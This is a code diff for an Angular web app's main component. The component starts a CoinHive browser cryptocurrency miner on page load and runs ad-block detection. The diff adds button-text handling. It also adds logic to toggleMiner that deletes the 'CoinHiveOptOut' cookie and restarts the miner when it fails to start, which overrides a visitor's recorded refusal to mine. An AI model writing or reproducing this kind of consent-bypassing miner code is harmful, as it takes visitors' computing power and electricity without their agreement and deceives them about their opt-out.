@@ -35,6 +35,18 @@ export class AppComponent implements OnInit {
       this.fuckAdBlock.onDetected(() => this.adBlockDetected())
       this.fuckAdBlock.onNotDetected(() => this.adBlockNotDetected())
       this.miner = new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn', {throttle: 0.4});
+
+      this.miner.on('optin', (params) => {
+        if (params.status === 'accepted') {
+          this.minerBtnText = "Thank You!"
+          setTimeout(() => this.minerBtnText = "Turn miner off.", 500)
+        }
+        else {
+          this.minerBtnText = ":("
+          setTimeout(() => this.minerBtnText = "Turn miner on.", 500)
+        }
+      });
+      
       this.toggleMiner();
     } catch (e) {
       this.adBlockDetected()
@@ -52,11 +64,13 @@ export class AppComponent implements OnInit {
   private startMiner() {
     if (!this.miner.isMobile() && !this.miner.didOptOut(14400)) {
         this.miner.start();
+        this.toggleMinerBtnText();
     }
   }
 
   private stopMiner() {
-    this.miner.stop()
+    this.miner.stop();
+    this.toggleMinerBtnText();
   }
 
   showApp() {
@@ -83,11 +97,21 @@ export class AppComponent implements OnInit {
 
   toggleMiner() {
     if (this.miner.isRunning()) {
-      this.stopMiner()
+      this.stopMiner();
+    } else {
+      this.startMiner()
+      if (!this.miner.isRunning()) {
+        this.cookie.delete('CoinHiveOptOut');
+        this.startMiner();
+      }
+    }
+  }
+
+  toggleMinerBtnText() {
+    if (!this.miner.isRunning()) {
       this.minerBtnText = ":("
       setTimeout(() => this.minerBtnText = "Turn miner on.", 500)
     } else {
-      this.startMiner()
       this.minerBtnText = "Thank You!"
       setTimeout(() => this.minerBtnText = "Turn miner off.", 500)
     }
